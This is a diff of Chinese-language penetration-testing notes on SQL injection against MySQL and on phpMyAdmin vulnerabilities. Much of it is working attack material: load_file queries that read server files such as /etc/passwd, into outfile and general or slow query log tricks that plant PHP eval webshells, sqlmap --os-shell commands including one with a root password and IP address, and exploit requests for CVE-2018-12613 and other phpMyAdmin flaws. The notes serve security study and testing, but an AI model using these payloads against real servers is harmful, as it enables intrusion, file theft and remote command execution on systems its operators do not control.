@@ -289,47 +289,46 @@ SQL注入漏洞了。
 
 - union注入读写文件(load_file函数和select  into outfile语句):
 
-- 读文件（）
 
-    1. 可以读取敏感文件，也可以发起网络请求，dnslog
+读文件（）
 
-    2. 条件限制：
+1. 可以读取敏感文件，也可以发起网络请求，dnslog
 
-        - 必须有权限读取并且文件必须完全可读。
+2. 条件限制：
 
-        - ```
-            and (select count(*) from mysql.user)>0 /*如果结果返回正常，说明具有读写权限.*/
-            and (select count(*) from mysql.user)>0 /* 返回错误，应该是管理员给数据库账户降权了*/
-            ```
+    - 必须有权限读取并且文件必须完全可读。
 
-        - 欲读取文件必须在服务器上
-
-        - 欲读取文件必须小于max_allowed_packet　　
-
-        - 如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限。
-
-        - 在windows下，如果NTFS设置得当，是不能读取相关的文件的，当遇到administrators才能访问的文件，users就不能实现用load_file读取文件了
-
-    3. ```mysql
-        #需要知道文件的物理路径：
-        union select 1,2,load_file("e:/3.txt")#， 
-        可以将path转成16进制，
-        `union select 1,2,load_file(0x653a2f332e747874)#`   
-        e:/3.txt 转换成16进制 0x653a2f332e747874
-        
-        如果显示读出来的是blob二进制对象，可以使用下面这行命令转换成字符串
-        select 1,2,CONVERT(load_file("d:/1.php") USING utf8mb4); 
+    - ```
+        and (select count(*) from mysql.user)>0 /*如果结果返回正常，说明具有读写权限.*/
+        and (select count(*) from mysql.user)>0 /* 返回错误，应该是管理员给数据库账户降权了*/
         ```
 
-- 写文件
+    - 欲读取文件必须在服务器上
+
+    - 欲读取文件必须小于max_allowed_packet　　
+
+    - 如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限。
+
+    - 在windows下，如果NTFS设置得当，是不能读取相关的文件的，当遇到administrators才能访问的文件，users就不能实现用load_file读取文件了
+
+3. ```mysql
+    #需要知道文件的物理路径：
+    union select 1,2,load_file("e:/3.txt")#， 
+    可以将path转成16进制，
+    `union select 1,2,load_file(0x653a2f332e747874)#`   
+    e:/3.txt 转换成16进制 0x653a2f332e747874
+    
+    如果显示读出来的是blob二进制对象，可以使用下面这行命令转换成字符串
+    select 1,2,CONVERT(load_file("d:/1.php") USING utf8mb4); 
+    ```
+
+写文件:
+
+- 要求
 
     - 需要对目标目录具有写权限
 
-    - 要知道网站的绝对路径
-
-    - GPC关闭(GPC:是否对单引号转义)
-
-    - 没有配置secure-file-priv。可以通过select @@secure_file_priv;查询
+        - 没有配置secure-file-priv。可以通过`select @@secure_file_priv;`查询
 
         - ```
             如果为NULL,则不能写入
@@ -337,9 +336,26 @@ SQL注入漏洞了。
             （3）：如果为一个路径，可以在该文件路径写入
             ```
 
+
+    - **要知道网站的绝对路径**
+        - phpinfo() 页面：最理想的情况，直接显示web路径
+        - web报错信息：可以通过各种fuzz尝试让目标报错，也有可能爆出绝对路径
+        - 一些集成的web框架：如果目标站点是利用phpstudy、LAMPP等之类搭建的，可以通过查看数据库路径show variables like '%datadir%'; 再猜解web路径的方法，一般容易成功。
+        -  利用select load_file() 读取文件找到web路径：可以尝试/etc/passwd，apache|nginx|httpd log之类的文件。
+        - Trick：如何判断目录是否存在，往往确定了/var/www/html目录，但是还有一层目录不能 确定，可以采用目标域名+常用的网站根目录的方式进行爆破，当使用  select 'test' into outfile '/var/www/$fuzz$/shell.php'；时目录fuzz不存在将会报错Can't create/write to file '/var/www/html/666.txt' (Errcode: 2)；如果存在但是目录写不进去将返回(Errcode: 13)；如果使用的 load data infile "/etc/passwd" into table test;该语句执行后将也会显示文件是否存在，有权限能否写等信息。
+        - @@datadir参数看mysql路径 反猜绝对路径
+        - 查看数据库表内容获取 有一些cms会保存网站配置文件 或者路径
+
+
+    - GPC关闭(GPC:是否对单引号转义)
+
     - **root权限**
 
-    - ```sql
+- **select into outfile**
+
+    - 可以写入多行
+
+    - ```url
         union select 1,2,'<?php     @eval($_POST[aaa]);?>' into     outfile 'd:/1.php' 
         #1.php的 文件内容1	2	<?php     @eval($_POST[aaa]);?>
         
@@ -362,72 +378,77 @@ SQL注入漏洞了。
         ?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#
         
         ?id=1 INTO OUTFILE '物理路径' lines starting by    （一句话hex编码）#
-        
         ```
+
+- ```
+    into dumpfile()：只能写一行,而且没有转义符号，也就是没有换行之类的功能
+    ```
+
+- 在mysql 5.6.34版本以后 secure_file_priv的值默认为NULL。并且无法用sql语句对其进行修改，就是不让导出
 
     - ```
-        into dumpfile()：只能写一行,而且没有转义符号，也就是没有换行之类的功能
+        解决办法：
+        
+        在Windows下可在my.ini的[mysqld]里面，添加secure_file_priv=
+        在linux下可在/etc/my.cnf的[mysqld]里面，添加secure_file_priv=
+        然后重启服务器
         ```
 
-    1. 在mysql 5.6.34版本以后 secure_file_priv的值默认为NULL。并且无法用sql语句对其进行修改，就是不让导出
+    - 但是我们一般没法去修改服务器的配置文件
+        
 
-        - ```bash
-            解决办法：
-            
-            在Windows下可在my.ini的[mysqld]里面，添加secure_file_priv=
-            
-            在linux下可在/etc/my.cnf的[mysqld]里面，添加secure_file_priv=
-            ```
+- **通过修改MySQL的log文件来获取Webshell。**
 
-        - **使用慢查询日志绕过此限制**
+    - 原理：
 
-            ```sql
-            show variables like '%slow_query_log%';			#查看慢查询日志开启情况
-            
-            set global slow_query_log=1						#开启慢查询日志
-            
-            set global slow_query_log_file='D:/phpStudy/WWW/evil.php;    #修改日志文件存储的绝对路径
-            
-            '<?php @eval($_POST[1]);?>' or sleep(11);		#写入shell
-            
-            show global variables like '%long_query_time%'; #使用慢查询日志时，只有当查询时间超过系统时间(默认为10秒)时才会记录在日志中，使用如下语句可查看系统时间
-            ```
+        - MySQL 5.0版本以上会创建日志文件，然后执行的sql语句会被写入到日志文件中，我们通过修改日志文件的位置到网站上，就相当于写入了一个webshell了。
 
-        - **通过修改MySQL的log文件来获取Webshell。**
+    - **需要满足的条件**
 
-            - **需要满足的条件**
+        - 对web目录有写权限，这个和secure-file-priv的值没有关系。一般都会有权限写web目录的。
 
-                - 对web目录有写权限
+        - GPC关闭(GPC:是否对单引号转义)
 
-                - GPC关闭(GPC:是否对单引号转义)
+        - 有绝对路径(读文件可以不用，写文件需要)
 
-                - 有绝对路径(读文件可以不用，写文件需要)
+        - 需要能执行多行SQL语句
 
-                - 需要能执行多行SQL语句
+    - ```mysql
+        show variables like '%general%';            	 # 查看配置
+        #先来看MySQL的两个全局变量：general_log 和 general_log file。general log 指的是日志保存状态，ON代表开启 OFF代表关闭。general log file 指的是日志的保存路径。这两个变量我们都可以修改
+        
+        set global general_log = on;              		 # 开启general log模式,将所有到达MySQL Server的SQL语句记录下来。
+        
+        set global general_log_file = 'C:/Users/Administrator/Downloads/phpStudy20161103/WWW/123.php'; # 设置日志目录为shell地址
+        
+        select '<?php eval($_POST["cmd"]);?>'             	 # 写入shell
+        
+        
+        set global general_log=off;                  	 # 关闭general log模式
+        ```
 
-            - ```
-                show variables like '%general%';            	 # 查看配置
-                
-                set global general_log = on;              		 # 开启general log模式,将所有到达MySQL Server的SQL语句记录下来。
-                
-                set global general_log_file = 'D:/WWW/evil.php'; # 设置日志目录为shell地址
-                
-                select '<?php eval($_GET[g]);?>'             	 # 写入shell
-                
-                set global general_log=off;                  	 # 关闭general log模式
-                ```
+    -  然后webshell连接就行
 
-        - ```sql
-            --os-cmd="net user"
-            #交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径下创建文件返回结果，然后再自动删除。
-            
-            --os-shell
-            #写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。
-            #注意:关闭sqlmap文件就会被删除。
-            ```
+- **通过慢查询日志写入webshell**
 
+    - 和日志原理一样，不过这个是慢查询日志，**慢查询日志用来记录在 MySQL 中执行时间超过指定时间的查询语句**
+
+    - ```
+        show variables like '%slow_query_log%';			#查看慢查询日志开启情况
+        
+        set global slow_query_log=on						#开启慢查询日志
+        
+        set global slow_query_log_file='D:/phpStudy/WWW/evil.php;    #修改日志文件存储的绝对路径
+        
+        '<?php @eval($_POST[1]);?>' or sleep(11);		#写入shell
+        
+        show global variables like '%long_query_time%'; #使用慢查询日志时，只有当查询时间超过系统时间(默认为10秒)时才会记录在日志中，使用如下语句可查看系统时间
+        ```
+
+    - 
 
 ### 双查询报错注入(一次最多爆出32位字符)
+
 SQL语句中有语法错误，根据返回的错误信息，可以察觉到一些数据库信息。
 **适用场景**：**没有数据回显，条件正确与否结果一样，sleep没区别，但是错误信息会打印出来**
 **利用方式**:     利用语法错误，把value在前端输出
@@ -1659,23 +1680,13 @@ ResultSet resultSet = pstt.executeQuery(sql);//返回结果集，封装了全部
 - Webshell提权分两种：一是利用**outfile函数**，另外一种是利用**--os-shell**；UDF提权通过堆叠注入实现；MOF提权通过"条件竞争"实现
 - 有sql注入试着––is–dba，如果有有绝对路径就––os–shell，不行扫后台，尝试用管理员账户密码登录
 
-### 通过select into 写入webshell
-
-- 需要对目标目录具有写权限
+### 写入webshell
 
 - 要知道网站的绝对路径:  **可以通过sqlmap读取配置文件获取网站绝对路径,也可构造load_file()读取文件**
 
     `sqlmap --file-read /etc/httpd/conf/httpd.conf`
 
 - GPC关闭(GPC:是否对单引号转义)
-
-- 没有配置secure-file-priv
-
-    - secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出
-
-        当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下
-
-        当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制
 
 - 数据库管理员权限
 
@@ -1860,7 +1871,7 @@ ResultSet resultSet = pstt.executeQuery(sql);//返回结果集，封装了全部
         
         - 经测试没有sqlmap好用，sqlmap有用，msf没有复现成功(因为Metasploit提供的exploit适应于5.5.9以下)。
         
-    - `python sqlmap.py -d "mysql://root:123456@119.90.126.9:3306/dedecms" --os-shell `
+    - `python sqlmap.py -d "mysql://root:123456@119.90.126.9:3306/information_scheme" --os-shell `
 
 - **UDF提权后如何反弹shell**
 
@@ -1984,6 +1995,79 @@ ResultSet resultSet = pstt.executeQuery(sql);//返回结果集，封装了全部
 
 1. - **将低权限账户提权至高权限账户，然后通过一些操作执行系统命令。**
     - **select      \* from v$session****可以查看连接数据库的用户名，主机名，借此可以进行下一步的渗透。**
+
+## phpmyadmin
+
+- phpMyAdmin  是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。
+- 默认账号密码root/root，他的密码不是mysql数据库的密码，只是登陆这个网页的密码，不过有可能一样。
+
+在我们知道密码之后（比如爆破密码），登陆后就可以执行sql命令，就和sql注入一样利用了。
+
+- into outfile直接写木马网页：
+- 利用日志文件Getshell：需要读写权限
+- 通过慢查询写入webshell：
+- udf提权，mof提权
+
+**phpmyadmin自身的漏洞：**
+
+- 版本探测：
+    - 登陆后台右小角会显示。
+    - 直接访问：/doc/html/index.html目录（如果没有删掉的话）
+
+- **WooYun-2016-199433：任意文件读取漏洞。**影响范围：phpMyAdmin version2.x版本
+
+    - ```http
+        POST /scripts/setup.php HTTP/1.1 
+        Host: your-ip:8080
+        Accept-Encoding: gzip, deflate Accept: */*
+        Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent/5.0)
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded 
+        Content-Length: 80
+        
+        action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
+        ```
+
+- **CVE-2014 -8959：本地文件包含。4.0.1~4.2.12**    **< 5.3.4**
+
+    - ```
+        POC如下：/gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&gis_data[gis_type]=/../../../../phpinfo.txt%00    # 注意改下token值
+        ```
+
+- **CVE-2016-5734 ：后台命令执行RCE**
+
+    - ```
+        影响范围：
+        phpMyAdminversion
+            4.0.10.16之前的4.0.x版本
+            4.4.15.7之前的 4.4.x版本
+            4.6.3之前的 4.6.x版本
+        PHPversion
+        	4.3.0~5.4.6Php5.0版本以上的将 preg_replace 的 /e修饰符给废弃
+        
+        ```
+
+- **CVE-2018-12613：后台文件包含**   **4.8.0和4.8.1**
+
+    - ```
+        利用如下：
+        （1）执行SQL语句，将PHP代码写入Session文件中：
+        select '<?php echo "hello"; eval($_POST["liudehua"]; ?>';
+        （2）包含session文件：
+        	http:/ /10.1.1.10/phpmyadmin/index.php?		target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_***   
+        # *** 为phpMyAdmin的COOKIE值
+        ```
+
+    - 可以先包含/etc/passwd看漏洞是否存在；
+
+- **CVE-2018-19968：任意文件包含/RCE** 4.8.0~4.8.3
+
+- **CVE-2020-0554：后台SQL注入**
+
+    - phpMyAdmin 4< 4.9.4phpMyAdmin 5< 5.0.1前提：已知一个用户名密码
+
+- 
+
 
 
 
